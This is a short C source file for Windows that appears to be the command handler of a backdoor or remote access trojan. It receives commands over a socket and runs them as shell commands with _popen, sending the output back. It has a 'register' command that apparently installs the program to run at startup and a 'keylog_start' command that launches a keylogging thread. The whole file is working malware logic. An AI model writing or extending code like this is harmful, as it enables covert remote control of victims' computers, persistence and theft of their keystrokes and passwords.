#include "utils.h"

#define bzero(p, size) (void)memset((p), 0, (size))

void Shell(int sock)
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1)
	{
	jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strncmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3) == 0)
		{
			chdir(str_cut(buffer, 3, 100));
		}
		else if (strncmp("register", buffer, 8) == 0)
		{
			bootRun(sock);
		}
		else if (strncmp("keylog_start", buffer, 12) == 0)
		{
			HANDLE thread = CreateThread(NULL, 0, logkey, NULL, 0, NULL);
			goto jump;
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r");

			while (fgets(container, 1024, fp) != NULL)
			{
				strcat(total_response, container);
			}

			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}